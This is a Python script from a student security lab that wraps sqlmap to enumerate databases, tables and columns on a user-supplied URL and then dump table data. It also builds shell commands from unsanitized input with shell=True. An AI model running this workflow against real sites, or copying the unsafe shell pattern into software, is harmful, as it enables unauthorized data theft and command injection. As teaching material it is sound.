# Experiment 8: SQL Injection (SQLi)
# Course: System Security Lab (CSL604)
# Name: Amey Thakur (https://github.com/Amey-Thakur)
# Roll No: 50
# Batch: B3
# Repository: https://github.com/Amey-Thakur/CRYPTOGRAPHY-AND-SYSTEM-SECURITY-AND-SYSTEM-SECURITY-LAB
# Date: April 20, 2021

"""
Experiment 8: Perform SQL injection on a vulnerable website.

Description:
This script serves as a wrapper for 'sqlmap', a powerful open-source penetration testing tool 
that automates the process of detecting and exploiting SQL injection flaws.
The script demonstrates the standard workflow for extracting data from a vulnerable database.

Workflow demonstrated:
1. List Databases (--dbs)
2. List Tables in a specific DB (-D ... --tables)
3. List Columns in a specific Table (-D ... -T ... --columns)
4. Dump Data from Columns (-D ... -T ... -C ... --dump)

Requirements:
- Python 3.x
- sqlmap installed and added to PATH (or Kali Linux)

Usage:
> python SQL_Injection_Tester.py
"""

import subprocess
import sys

def run_sqlmap(command):
    """
    Executes the sqlmap command.
    """
    print(f"\n[+] Executing: {command}")
    print("-" * 60)
    try:
        # Using shell=True for demonstration purposes and ease of command construction
        subprocess.run(command, shell=True)
        print("-" * 60)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    print("--- SQL Injection Automation (sqlmap wrapper) ---")
    url = input("Enter Vulnerable URL: ").strip()
    
    if not url:
        print("[!] URL is required.")
        return

    # Step 1: Enumerate Databases
    print("\n[1] Enumerating Databases...")
    run_sqlmap(f"sqlmap -u \"{url}\" --dbs --batch")
    
    proceed = input("\nDo you want to proceed to enumerate tables? (y/n): ").lower()
    if proceed != 'y': return

    # Step 2: Enumerate Tables
    db_name = input("Enter Database Name to enumerate: ").strip()
    print(f"\n[2] Enumerating Tables in {db_name}...")
    run_sqlmap(f"sqlmap -u \"{url}\" -D {db_name} --tables --batch")

    proceed = input("\nDo you want to proceed to enumerate columns? (y/n): ").lower()
    if proceed != 'y': return

    # Step 3: Enumerate Columns
    table_name = input("Enter Table Name to enumerate: ").strip()
    print(f"\n[3] Enumerating Columns in {table_name}...")
    run_sqlmap(f"sqlmap -u \"{url}\" -D {db_name} -T {table_name} --columns --batch")

    proceed = input("\nDo you want to dump data? (y/n): ").lower()
    if proceed != 'y': return

    # Step 4: Dump Data
    print(f"\n[4] Dumping Data from {table_name}...")
    run_sqlmap(f"sqlmap -u \"{url}\" -D {db_name} -T {table_name} --dump --batch")

if __name__ == "__main__":
    main()
